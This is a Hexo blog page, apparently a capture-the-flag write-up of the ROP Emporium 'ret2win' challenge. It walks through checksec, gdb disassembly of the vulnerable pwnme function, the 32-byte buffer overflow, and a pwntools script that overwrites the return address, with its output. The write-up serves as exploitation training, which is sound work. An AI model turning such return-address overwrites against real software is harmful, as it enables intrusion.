@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.2.0">
+
+<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"thuri10.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"default"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.This challenge is classical pwn challenge of overwriting the return address with de">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="RopEmporium ret2win challenge">
+<meta property="og:url" content="http://thuri10.github.io/2021/12/20/ROP-ret2win/index.html">
+<meta property="og:site_name" content="LaByte">
+<meta property="og:description" content="Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.This challenge is classical pwn challenge of overwriting the return address with de">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://thuri10.github.io/images/ropemporium/stack.png">
+<meta property="article:published_time" content="2021-12-20T20:20:18.000Z">
+<meta property="article:modified_time" content="2022-09-23T10:11:39.418Z">
+<meta property="article:author" content="Thuri">
+<meta property="article:tag" content="ropemporium">
+<meta property="article:tag" content="rop">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://thuri10.github.io/images/ropemporium/stack.png">
+
+
+<link rel="canonical" href="http://thuri10.github.io/2021/12/20/ROP-ret2win/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://thuri10.github.io/2021/12/20/ROP-ret2win/","path":"2021/12/20/ROP-ret2win/","title":"RopEmporium ret2win challenge"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>RopEmporium ret2win challenge | LaByte</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">LaByte</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Messing Bits</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Thuri</p>
+  <div class="site-description" itemprop="description">Messy Bits</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/thuri10" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;thuri10" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:thuri783@gmail.com" title="E-Mail → mailto:thuri783@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/0xhexski" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;0xhexski" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://thuri10.github.io/2021/12/20/ROP-ret2win/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Thuri">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LaByte">
+      <meta itemprop="description" content="Messy Bits">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="RopEmporium ret2win challenge | LaByte">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          RopEmporium ret2win challenge
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: December 20 2021 23:20:18" itemprop="dateCreated datePublished" datetime="2021-12-20T23:20:18+03:00">December 20 2021</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <blockquote>
+<p>Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack.This challenge is classical pwn challenge of overwriting the return address with desired address you want to return to.</p>
+</blockquote>
+<span id="more"></span>
+
+<p>The binaries for the challenges can be downloaded from the author&#96;s website <a target="_blank" rel="noopener" href="https://ropemporium.com/">ropemporium</a>.The goal of first challenge is to call the <strong>ret2win</strong> function.</p>
+<p>After downloading the binary, the first is to check binary protection enabled on the binary using <code>checksec</code> utility.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:ret2win$ checksec --file ret2win
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Only <strong>NX</strong> (Not executable) is enabled on the binary meaning we cannot execute code stored on the stack like <code>shellcode</code>. Toe analyze the behavior of the program we will use <code>gdb</code>. gdb is a tool that enables one to inspect the behavior of binaries at runtime.</p>
+<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(gdb) info functions
+All defined functions:
+
+Non<span class="token operator">-</span>debugging symbols:
+<span class="token number">0x0000000000400528</span>  _init
+<span class="token number">0x0000000000400550</span>  puts@plt
+<span class="token number">0x0000000000400560</span>  system@plt
+<span class="token number">0x0000000000400570</span>  printf@plt
+<span class="token number">0x0000000000400580</span>  memset@plt
+<span class="token number">0x0000000000400590</span>  read@plt
+<span class="token number">0x00000000004005a0</span>  setvbuf@plt
+<span class="token number">0x00000000004005b0</span>  _start
+<span class="token number">0x00000000004005e0</span>  _dl_relocate_static_pie
+<span class="token number">0x00000000004005f0</span>  deregister_tm_clones
+<span class="token number">0x0000000000400620</span>  register_tm_clones
+<span class="token number">0x0000000000400660</span>  __do_<span class="token keyword">global_dtors_aux</span>
+<span class="token number">0x0000000000400690</span>  frame_dummy
+<span class="token number">0x0000000000400697</span>  main
+<span class="token number">0x00000000004006e8</span>  pwnme
+<span class="token number">0x0000000000400756</span>  ret2win
+<span class="token number">0x0000000000400780</span>  __libc_csu_init
+<span class="token number">0x00000000004007f0</span>  __libc_csu_fini
+<span class="token number">0x00000000004007f4</span>  _fini
+(gdb)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The binary has various functions has as shown in the output above.For initial analysis we start at the <code>main</code> function which is the entrypoint of our program.</p>
+<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(No debugging symbols found in ret2win)
+(gdb) disas main
+Dump of assembler code for function main:
+   <span class="token number">0x0000000000400697</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span>:	push   <span class="token register variable">rbp</span>
+   <span class="token number">0x0000000000400698</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
+   <span class="token number">0x000000000040069b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span>:	mov    <span class="token register variable">rax</span>,QWORD PTR <span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x2009b6</span><span class="token operator">]</span>        # <span class="token number">0x601058</span> <span class="token operator">&lt;</span>stdout@@GLIBC_2<span class="token number">.2</span>.<span class="token number">5</span><span class="token operator">></span>
+   <span class="token number">0x00000000004006a2</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span>:	mov    <span class="token register variable">ecx</span>,<span class="token number">0x0</span>
+   <span class="token number">0x00000000004006a7</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x2</span>
+   <span class="token number">0x00000000004006ac</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">21</span><span class="token operator">></span>:	mov    <span class="token register variable">esi</span>,<span class="token number">0x0</span>
+   <span class="token number">0x00000000004006b1</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">26</span><span class="token operator">></span>:	mov    <span class="token register variable">rdi</span>,<span class="token register variable">rax</span>
+   <span class="token number">0x00000000004006b4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">29</span><span class="token operator">></span>:	call   <span class="token number">0x4005a0</span> <span class="token operator">&lt;</span>setvbuf@plt<span class="token operator">></span>
+   <span class="token number">0x00000000004006b9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">34</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x400808</span>
+   <span class="token number">0x00000000004006be</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">39</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
+   <span class="token number">0x00000000004006c3</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">44</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x400820</span>
+   <span class="token number">0x00000000004006c8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">49</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
+   <span class="token number">0x00000000004006cd</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">54</span><span class="token operator">></span>:	mov    <span class="token register variable">eax</span>,<span class="token number">0x0</span>
+   <span class="token number">0x00000000004006d2</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">59</span><span class="token operator">></span>:	call   <span class="token number">0x4006e8</span> <span class="token operator">&lt;</span>pwnme<span class="token operator">></span>
+   <span class="token number">0x00000000004006d7</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x400828</span>
+   <span class="token number">0x00000000004006dc</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">69</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
+   <span class="token number">0x00000000004006e1</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">74</span><span class="token operator">></span>:	mov    <span class="token register variable">eax</span>,<span class="token number">0x0</span>
+   <span class="token number">0x00000000004006e6</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">79</span><span class="token operator">></span>:	pop    <span class="token register variable">rbp</span>
+   <span class="token number">0x00000000004006e7</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">80</span><span class="token operator">></span>:	ret
+End of assembler dump.
+(gdb)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>From the initial analysis of the main function,main call an interesting function called <strong>pwnme</strong>. Next is to disassemble <strong>pwnme</strong> function to understand the behavior.</p>
+<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(gdb) disas pwnme
+Dump of assembler code for function pwnme:
+   <span class="token number">0x00000000004006e8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span>:	push   <span class="token register variable">rbp</span>
+   <span class="token number">0x00000000004006e9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
+   <span class="token number">0x00000000004006ec</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span>:	sub    <span class="token register variable">rsp</span>,<span class="token number">0x20</span>
+   <span class="token number">0x00000000004006f0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
+   <span class="token number">0x00000000004006f4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">></span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x20</span>
+   <span class="token number">0x00000000004006f9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">17</span><span class="token operator">></span>:	mov    <span class="token register variable">esi</span>,<span class="token number">0x0</span>
+   <span class="token number">0x00000000004006fe</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">22</span><span class="token operator">></span>:	mov    <span class="token register variable">rdi</span>,<span class="token register variable">rax</span>
+   <span class="token number">0x0000000000400701</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">25</span><span class="token operator">></span>:	call   <span class="token number">0x400580</span> <span class="token operator">&lt;</span>memset@plt<span class="token operator">></span>
+   <span class="token number">0x0000000000400706</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x400838</span>
+   <span class="token number">0x000000000040070b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">35</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
+   <span class="token number">0x0000000000400710</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">40</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x400898</span>
+   <span class="token number">0x0000000000400715</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">45</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
+   <span class="token number">0x000000000040071a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">50</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x4008b8</span>
+   <span class="token number">0x000000000040071f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">55</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
+   <span class="token number">0x0000000000400724</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x400918</span>
+   <span class="token number">0x0000000000400729</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">65</span><span class="token operator">></span>:	mov    <span class="token register variable">eax</span>,<span class="token number">0x0</span>
+   <span class="token number">0x000000000040072e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">70</span><span class="token operator">></span>:	call   <span class="token number">0x400570</span> <span class="token operator">&lt;</span>printf@plt<span class="token operator">></span>
+   <span class="token number">0x0000000000400733</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">75</span><span class="token operator">></span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
+   <span class="token number">0x0000000000400737</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">79</span><span class="token operator">></span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x38</span>
+   <span class="token number">0x000000000040073c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">84</span><span class="token operator">></span>:	mov    <span class="token register variable">rsi</span>,<span class="token register variable">rax</span>
+   <span class="token number">0x000000000040073f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">87</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x0</span>
+   <span class="token number">0x0000000000400744</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">92</span><span class="token operator">></span>:	call   <span class="token number">0x400590</span> <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>
+   <span class="token number">0x0000000000400749</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">97</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x40091b</span>
+   <span class="token number">0x000000000040074e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">102</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
+   <span class="token number">0x0000000000400753</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">107</span><span class="token operator">></span>:	nop
+   <span class="token number">0x0000000000400754</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">108</span><span class="token operator">></span>:	leave
+   <span class="token number">0x0000000000400755</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">109</span><span class="token operator">></span>:	ret
+End of assembler dump.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>From analysis of the above assembly code, we fill a buffer of size 0x20(32bytes) with a constant byte of zero. <strong>memset</strong> is used to overwrite any values present memory area specified. The memory we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32 bytes from the address of base pointer as shown in the stack diagram below.</p>
+<p><img data-src="/images/ropemporium/stack.png"></p>
+<p>Next function is <strong>read</strong> function, which reads from the standard input file descriptor and stores in the specified buffer.From the disassembled code we are reading 0x38 bytes from the user input and storing it in our buffer.</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token comment">//0 is file descriptor stdin</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Because we are reading more than what the buffer can hold, we corrupt the adjacent memory regions therefore causing a stack buffer overflow. Therefore in order to control the return address as shown in the stack image above is to fill the buffer, overwrite the <code>rbp</code> register and control the return address with <strong>ret2win</strong> function address.</p>
+<p>The exploit code for this ret2win function is,</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pwn
+
+pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"latin-1"</span>
+pwn<span class="token punctuation">.</span>warnings<span class="token punctuation">.</span>simplefilter<span class="token punctuation">(</span><span class="token string">"ignore"</span><span class="token punctuation">)</span>
+pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
+
+io <span class="token operator">=</span> pwn<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">'./ret2win'</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token comment"># fill the buffer</span>
+payload <span class="token operator">+=</span> <span class="token string">b"B"</span> <span class="token operator">*</span> <span class="token number">8</span>  <span class="token comment">#overwrite saved base pointer</span>
+payload <span class="token operator">+=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x400756</span><span class="token punctuation">)</span>  <span class="token comment">#Address of ret2win function</span>
+io<span class="token punctuation">.</span>writeafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+pwn<span class="token punctuation">.</span>info<span class="token punctuation">(</span>io<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Running the above script we get correct flag.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:ret2win$ python3 x.py
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'./ret2win'</span><span class="token builtin class-name">:</span> pid <span class="token number">45427</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  Thank you<span class="token operator">!</span>
+    Well done<span class="token operator">!</span> Here<span class="token string">'s your flag:
+    ROPE&#123;a_placeholder_32byte_flag!&#125;
+[*] Process '</span>./ret2win' stopped with <span class="token builtin class-name">exit</span> code <span class="token number">0</span> <span class="token punctuation">(</span>pid <span class="token number">45427</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+    </div>
+
+    
+    
+    
+      
+
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ropemporium/" rel="tag"># ropemporium</a>
+              <a href="/tags/rop/" rel="tag"># rop</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/12/17/ROP-Split/" rel="prev" title="RopEmporium split challenge">
+                  <i class="fa fa-chevron-left"></i> RopEmporium split challenge
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/12/20/ROP-ret2csu/" rel="next" title="RopEmporium ret2csu challenge">
+                  RopEmporium ret2csu challenge <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Thuri</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
